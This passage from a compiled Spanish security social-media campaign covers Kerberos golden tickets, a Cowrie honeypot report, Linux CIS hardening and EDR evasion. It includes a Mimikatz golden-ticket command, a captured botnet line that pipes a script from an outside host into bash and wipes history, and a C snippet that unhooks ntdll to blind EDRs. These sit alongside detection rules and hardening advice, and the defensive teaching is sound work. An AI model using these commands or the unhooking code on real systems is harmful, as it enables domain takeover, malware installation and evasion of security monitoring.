    TargetUserName|endswith: '$'
  timeframe: 2m
  condition: selection and not filter_machine_accounts | count() by TargetUserName > 5
level: high
```

---

**[5/10] EL ESCENARIO PESADILLA: GOLDEN TICKET (T1558.001)**  
Si un atacante extrajo el hash de la cuenta `krbtgt`:
Puede generar un TGT (Ticket Granting Ticket) falso usando Mimikatz:
`kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /id:500 /ptt`

Consecuencia:
- Se otorga membresía en Enterprise Admins.
- Puede inventarse nombres de usuario que ni siquiera existen en el Directorio.
- El ticket puede configurarse con una validez de 10 años.

---

**[6/10] CÓMO CAZAR UN TICKET DORADO**  
Dado que el ticket está firmado con la clave real de `krbtgt`, el DC lo valida criptográficamente.  
¿Dónde falla el atacante?
1. **Event ID 4624 (Logon)** con un TGT que no tiene un correspondiente **Event ID 4768 (TGT Request)** previo registrado en los logs del KDC en las últimas 10 horas.
2. **Renovación infinita**: Duración de validez superior a la política de Kerberos del dominio (por defecto 10 horas).
3. **Cuentas fantasma**: Inicios de sesión con SIDs de alto privilegio donde el nombre de usuario no existe en la base de datos ntds.dit.

---

**[7/10] LA MEDIDA PREVENTIVA DEFINITIVA: RESIDUAL KRBTGT**  
Para invalidar todos los Golden Tickets existentes en un bosque comprometido:
Debes rotar la contraseña de la cuenta `krbtgt` **DOS VECES seguidas** (dejando un intervalo de 24 horas entre rotaciones para permitir la replicación del historial de contraseñas de Kerberos).  
Microsoft dispone de un script oficial de PowerShell (`New-KrbtgtKeys.ps1`) para orquestar este proceso sin romper los servicios en producción.

---

**[8/10] HARDENING CONTRA KERBEROASTING**  
Para erradicar la superficie de ataque hoy mismo:
1. Migra todas las cuentas de servicio tradicionales a **Group Managed Service Accounts (gMSA)**: contraseñas de 128 caracteres rotadas automáticamente por el DC cada 30 días.
2. Fuerza el uso exclusivo de cifrado AES (`msDS-SupportedEncryptionTypes = 24`) y deshabilita RC4 en el dominio.
3. Asigna contraseñas de más de 25 caracteres a cualquier cuenta que conserve SPNs.

---

**[9/10] CONCLUSIÓN DE SEGURIDAD DEFENSIVA**  
Active Directory sigue gobernando las redes corporativas del mundo.  
Aprender a auditar los eventos profundos de Kerberos es la diferencia entre ser un operador de alertas pasivo y un verdadero cazador de amenazas (Threat Hunter).

---

**[10/10] CTA & DOSSIER**  
He recopilado el playbook de auditoría de Active Directory, reglas Sigma y scripts de detección en mi dossier:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Cuándo fue la última vez que rotasteis la clave de krbtgt en vuestra infraestructura? Los leo abajo👇

---

---

## HILO 08: THREAT INTELLIGENCE & DECEPCIÓN ACTIVA
### *"El Honeypot Docker que monté en un VPS de 4€: Cazando botnets y mineros en menos de 48 horas"*

**[1/10] HOOK**  
Desplegué un VPS Debian básico de 4€/mes en Hetzner y expuse un honeypot SSH y Docker API intencionalmente vulnerable a Internet.  
En las primeras 48 horas:  
- 184.000 intentos de inicio de sesión por fuerza bruta.  
- 42 payloads descargados automáticamente por botnets.  
- 3 mineros de Monero (XMRig) neutralizados y analizados en sandbox.

Dentro el reporte forense y cómo montar tu propio radar de inteligencia de amenazas🧵👇

---

**[2/10] LA HERRAMIENTA: COWRIE + DOCKER SINK**  
Usamos **Cowrie**, un honeypot de interacción media para emular servidores SSH y Telnet.  
Simula una shell Bash completa de Linux, registra cada pulsación de teclado del atacante, captura los archivos que intenta descargar con `wget`/`curl` y graba las sesiones en vídeo reproducible (`ttyrec`).

```bash
docker run -d --name cowrie \
  -p 22:2222 \
  -v ./cowrie-logs:/cowrie/var/log/cowrie \
  -v ./cowrie-downloads:/cowrie/var/lib/cowrie/downloads \
  cowrie/cowrie:latest
```
*(Nota: El SSH real del host se movió previamente al puerto 44222 protegido por WireGuard).*

---

**[3/10] HORA 0 A HORA 6: LA PRIMERA OLA AUTOMATIZADA**  
A los 14 minutos de levantar el honeypot, comenzaron los primeros escaneos masivos de rangos CIDR desde servidores en Asia y Europa del Este.  
Los diccionarios más utilizados no eran sofisticados:
1. `root:root`
2. `admin:admin1234`
3. `ubuntu:ubuntu`
4. `test:123456`
5. Credenciales por defecto de dispositivos MikroTik y cámaras Hikvision.

---

**[4/10] HORA 18: EL PRIMER PAYLOAD DE MINERÍA**  
A las 18:32, una botnet con IP de origen en Bulgaria consiguió acceso con la combinación `support:support`.  
En menos de 800 milisegundos ejecutó una secuencia automatizada de reconocimiento y persistencia:

```bash
uname -a; lscpu; cat /proc/cpuinfo | grep 'model name'
curl -s -L http://45.142.xxx.xxx/init.sh | bash
history -c && rm -rf ~/.bash_history
```

---

**[5/10] INGENIERÍA INVERSA DEL SCRIPT `init.sh`**  
El honeypot capturó el script `init.sh` en su carpeta de descargas antes de que el comando borrara sus huellas.  
Al analizar el código con `shellcheck` y desofuscando variables base64:
- Mataba procesos de mineros competidores (`kill -9 $(pgrep xmrig)`).
- Modificaba `/etc/resolv.conf` para apuntar a servidores DNS públicos y no ser filtrado.
- Añadía una clave SSH pública en `/root/.ssh/authorized_keys`.
- Descargaba un binario ELF camuflado como `[kworker/0:1]` para evadir sospechas en `htop`.

---

**[6/10] CAZANDO LA INFRAESTRUCTURA C2**  
Extrajimos la configuración interna del binario ELF usando `strings` y Ghidra:
- Pool de minería: `stratum+tcp://xmr.pool-xxx.com:3333`
- Wallet de Monero: `48xxxx...`
- C2 de comando remoto: un canal IRC anónimo en el puerto 6667 con comandos de denegación de servicio (DDoS Mirai variant).

Subimos los hashes a VirusTotal: tasa de detección de solo 12/72 antivirus en las primeras horas.

---

**[7/10] VISUALIZACIÓN EN TIEMPO REAL CON ELK & GEOLOCALIZACIÓN**  
Conectamos los logs JSON de Cowrie a un panel de Elastic + Kibana:
- Mapa de calor de origen geográfico de los ataques.
- Diagrama Sankey de nombres de usuario vs contraseñas más probadas.
- Gráfico temporal de picos de escaneo sincronizados.

Un radar de inteligencia táctica propio funcionando 24/7 por 4 euros al mes.

---

**[8/10] SEGURIDAD CRÍTICA DEL HONEYPOT**  
⚠️ Advertencia de seguridad operativa:  
Un honeypot mal aislado puede ser utilizado como pivote por atacantes para atacar a terceros.
- Ejecuta el honeypot en una red Docker aislada con usuario no privilegiado (`UID 1000`).
- Aplica reglas de firewall de salida (egress) para prohibir que el honeypot envíe paquetes maliciosos hacia el exterior.
- Monitorea el consumo de CPU para evitar que minen en tu propio hierro.

---

**[9/10] EL VALOR PARA UN EQUIPO BLUE TEAM**  
Montar un honeypot no es solo diversión hacker:
- Te proporciona Indicadores de Compromiso (IoCs) frescos en tiempo real.
- Te permite alimentar tus listas negras locales de IP en firewalls de borde antes de que los feeds públicos las publiquen.
- Entrenas a tus analistas juniors con muestras de malware vivas en un entorno seguro.

---

**[10/10] CTA & GUÍA DE DESPLIEGUE**  
He preparado una guía paso a paso con los scripts de Cowrie, dashboards de visualización y medidas de contención en mi repositorio:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Has capturado alguna vez malware vivo en tus propios servidores? Cuéntame tu experiencia abajo👇

---

---

## HILO 09: AUTOMATIZACIÓN DE INFRAESTRUCTURA & BASTIONADO
### *"Hardening Linux militar: De una distro pelada a cumplir CIS Benchmark Level 2 con Ansible"*

**[1/10] HOOK**  
Una instalación limpia de Ubuntu Server o Debian tiene más de 40 vectores de ataque abiertos por defecto:  
Cifrados SSH obsoletos, parámetros de memoria compartida sin aislar, permisos laxos en el kernel y servicios de broadcast activos.

Audité un servidor recién instalado con Lynis: puntuación inicial de seguridad **58/100**.  
Tras ejecutar mi playbook de Ansible de bastionado automatizado: **94/100 (CIS Benchmark Level 2 compliant)** en 90 segundos.

Dentro las recetas críticas de hardening🧵👇

---

**[2/10] QUÉ ES CIS BENCHMARK Y POR QUÉ IMPORTA**  
El Center for Internet Security (CIS) establece los estándares de oro mundiales para configurar sistemas operativos de forma segura.  
- **Level 1**: Configuraciones de seguridad base con bajo impacto operacional.  
- **Level 2**: Bastionado estricto para entornos de defensa, banca e infraestructuras críticas donde la seguridad prima sobre la conveniencia.

Hacerlo a mano en 50 servidores es inviable. La automatización con Ansible es obligatoria.

---

**[3/10] PASO 1: PARTICIONADO Y PUNTOS DE MONTAJE SEGUROS**  
Los atacantes suelen usar `/tmp`, `/var/tmp` y `/dev/shm` para descargar y ejecutar binarios maliciosos.  
En `fstab`, forzamos flags restrictivos:

```text
# /etc/fstab
tmpfs   /dev/shm    tmpfs   defaults,noexec,nodev,nosuid    0   0
/tmp    /var/tmp    none    bind                            0   0
```
- `noexec`: Impide la ejecución directa de cualquier binario en memoria compartida.  
- `nosuid`: Anula la escalada de privilegios por bits SUID.  
- `nodev`: Prohíbe la creación de dispositivos de bloque o carácter.

---

**[4/10] PASO 2: HARDENING QUIRÚRGICO DEL KERNEL (`sysctl.conf`)**  
Cerramos vectores de red y ataques de spoofing directamente en el stack del kernel Linux:

```ini
# Deshabilitar redirección ICMP y source routing
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0

# Mitigar ataques SYN Flood
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048

# Aleatoriedad de memoria ASLR estricta
kernel.randomize_va_space = 2

# Restringir dmesg para usuarios sin privilegios
kernel.dmesg_restrict = 1
```

---

**[5/10] PASO 3: FORTALECIMIENTO DE SSH (`sshd_config`)**  
Eliminamos todas las reliquias de compatibilidad obsoletas:

```text
Port 44222
Protocol 2
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
KbdInteractiveAuthentication no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group16-sha512
```
Cero contraseñas. Solo llaves ED25519 con passphrase.

---

**[6/10] PASO 4: AUDITORÍA CONTINUA CON AUDITD**  
Si alguien modifica un archivo crítico del sistema, necesitamos un registro forense imborrable.  
Configuramos reglas en `/etc/audit/rules.d/audit.rules`:

```text
-w /etc/passwd -p wa -k identity_changes
-w /etc/shadow -p wa -k identity_changes
-w /etc/sudoers -p wa -k sudo_changes
-a always,exit -F arch=b64 -S execve -k command_execution
```
Cualquier intento de alteración queda firmado y enviado al SIEM centralizado.

---

**[7/10] PASO 5: EL PLAYBOOK DE ANSIBLE**  
Orquestamos todo esto en una sola tarea declarativa e idempotente:

```yaml
- name: Hardening Militar Linux CIS L2
  hosts: all
  become: yes
  roles:
    - role: hardening_sysctl
    - role: hardening_ssh
    - role: hardening_filesystem
    - role: auditd_monitoring
    - role: fail2ban_protection
```
Un solo comando (`ansible-playbook -i hosts site.yml`) y 100 servidores quedan blindados al unísono.

---

**[8/10] VERIFICACIÓN CON LYNIS**  
El resultado medible tras la ejecución:
- CIS Linux Score: **94.2%**
- Vulnerabilidades críticas pendientes: **0**
- Servicios no esenciales eliminados (`rpcbind`, `avahi-daemon`, `cups`).
- Cortafuegos `ufw` en modo Default Deny tanto en tráfico Inbound como Outbound no autorizado.

---

**[9/10] LECCIÓN PARA INGENIEROS DE SISTEMAS**  
La seguridad no es un parche que añades al final del proyecto.  
Es el cimiento sobre el que construyes. Tratar tu infraestructura como código inmutable y endurecido te permite dormir tranquilo cuando saltan alertas globales de seguridad.

---

**[10/10] CTA & CÓDIGO DEL PLAYBOOK**  
He liberado el playbook completo de Ansible para Debian/Ubuntu y CentOS en mi dossier de GitHub:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Qué nota saca tu servidor de producción actual en un análisis de Lynis? Pásale el test y cuéntame👇

---

---

## HILO 10: INGENIERÍA INVERSA & ANÁLISIS DE EVASIÓN
### *"Bypass de EDRs comerciales por DLL Sideloading y API Unhooking: Análisis ofensivo para cazadores de amenazas"*

**[1/10] HOOK**  
Las soluciones EDR de gama alta (CrowdStrike, SentinelOne, Defender for Endpoint) monitorizan los procesos colocando "hooks" en las funciones nativas de la API de Windows en `ntdll.dll`.  
Si aprendes cómo los adversarios eliminan esos hooks en memoria (Unhooking) y abusan de binarios firmados por Microsoft (DLL Sideloading), entenderás por qué la detección basada en firmas está completamente muerta.

Dentro análisis ofensivo-defensivo en C/C++🧵👇

---

**[2/10] CÓMO FUNCIONA EL MONITOR DE UN EDR**  
Cuando un proceso arranca en Windows, el EDR inyecta su propia DLL defensiva en el espacio de memoria de ese proceso.  
La DLL defensiva sobreescribe los primeros bytes de funciones críticas del kernel como `NtAllocateVirtualMemory` o `NtCreateThreadEx` con una instrucción `JMP` hacia el motor de análisis del EDR.  
Si el atacante intenta reservar memoria RWX para ejecutar shellcode, el EDR lo intercepta antes de que la llamada llegue al kernel.

---

**[3/10] LA TÉCNICA DEL UNHOOKING (LIMPIEZA DE MEMORIA)**  
¿Cómo neutraliza esto el atacante avanzado?  
La copia en disco de `C:\Windows\System32\ntdll.dll` está limpia (sin hooks del EDR).  
El loader malicioso:
1. Abre el archivo `ntdll.dll` legítimo en disco como un archivo estándar con `CreateFileA`.
2. Lee la sección `.text` original desde el disco a un búfer.
3. Sobreescribe la sección `.text` de la `ntdll.dll` que está en memoria (utilizando `VirtualProtect` para cambiar temporalmente los permisos a `PAGE_EXECUTE_READWRITE`).
4. **Resultado**: Los hooks del EDR son eliminados y reemplazados con los bytes originales limpios de Microsoft.

---

**[4/10] POCO EN C: RESTAURANDO LA NTDLL ORIGINAL**  
Snippet simplificado de restauración de bytes:

```c
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// Leer cabeceras PE y mapear .text
DWORD oldProtect = 0;
VirtualProtect((LPVOID)ntdllTextSectionInMemory, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy((LPVOID)ntdllTextSectionInMemory, (LPVOID)cleanNtdllSectionFromFile, sectionSize);
VirtualProtect((LPVOID)ntdllTextSectionInMemory, sectionSize, oldProtect, &oldProtect);
```
Tras estas 5 líneas, el EDR queda ciego ante cualquier Syscall posterior ejecutada por el proceso.

---

**[5/10] EL COMPLEMENTO PERFECTO: DLL SIDELOADING (T1574.002)**  
Para ejecutar este loader sin que salten las alarmas de ejecución de binarios sospechosos:
Los atacantes utilizan un ejecutable legítimo y firmado digitalmente por Microsoft (ej: `OneDriveStandaloneUpdater.exe` o `teams.exe`).  
Si ese ejecutable busca una DLL secundaria sin ruta absoluta, el atacante coloca su DLL maliciosa con el mismo nombre en la misma carpeta local.  
El ejecutable firmado de Microsoft carga y ejecuta el payload con total confianza del sistema operativo.

---

**[6/10] CÓMO DETECTAN LOS THREAT HUNTERS ESTE VECTOR**  
Como defensores (Blue Team), no intentamos detectar el shellcode cifrado.  
Detectamos **las anomalías del proceso**:
1. **Sysmon Event ID 7 (Image Loaded)**: Un binario firmado cargando una DLL no firmada o desde una ruta anómala (`C:\Users\AppData\Local\Temp`).
2. **Modificación de permisos de memoria**: Alertas de llamadas a `VirtualProtect` sobre secciones de memoria compartida conocidas como `.text` de módulos del sistema.

---

**[7/10] DETECCIÓN A NIVEL DE KERNEL: ETW-TI**  
La respuesta moderna de los defensores frente al Unhooking:  
**Event Tracing for Windows - Threat Intelligence (ETW-TI)**.  
ETW-TI opera a nivel del Kernel (`ntoskrnl.exe`), por debajo del espacio de usuario (Ring 3).  
Incluso si el atacante borra todos los hooks de `ntdll.dll` en memoria de usuario, cuando se ejecuta la Syscall hacia el kernel, ETW-TI registra el evento y alerta de que el puntero de retorno (Return Address) no proviene de una región de memoria legítima.

---

**[8/10] REGLA DE DETECCIÓN YACAT / SIGMA**  
Para cazar DLL Sideloading común en tu parque:

```yaml
title: DLL Sideloading Sospechoso en Directorios de Usuario
status: experimental
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 7
    Signed: 'false'
    ImageLoaded|contains:
      - '\AppData\Local\'
      - '\Windows\Temp\'
  filter:
    SignatureStatus: 'Valid'
  condition: selection and not filter
level: high
```

---

**[9/10] LA MORALEJA DE LA CIBERSEGURIDAD MODERNA**  
Para defender un sistema, debes pensar con la precisión y el ingenio de quien busca romperlo.  
La seguridad estática es una ilusión: solo la telemetría profunda, la correlación en tiempo real y la comprensión del kernel permiten cazar a adversarios reales.

---

**[10/10] CTA & PROYECTOS**  
Si quieres profundizar en análisis de malware, ingeniería de detección y pruebas de concepto en entornos de laboratorio controlados:  
Visita mi dossier de ingeniería y proyectos avanzados:  
🔗 [https://github.com/K4L189/k4lianuuforge](https://github.com/K4L189/k4lianuuforge)  

¿Has analizado casos de DLL Sideloading en incidentes reales? Déjame tus impresiones en los comentarios👇

---
*Fin de la Campaña de 30 Días — Compilado por Set ⚡ & Rosa Gris 🌸*
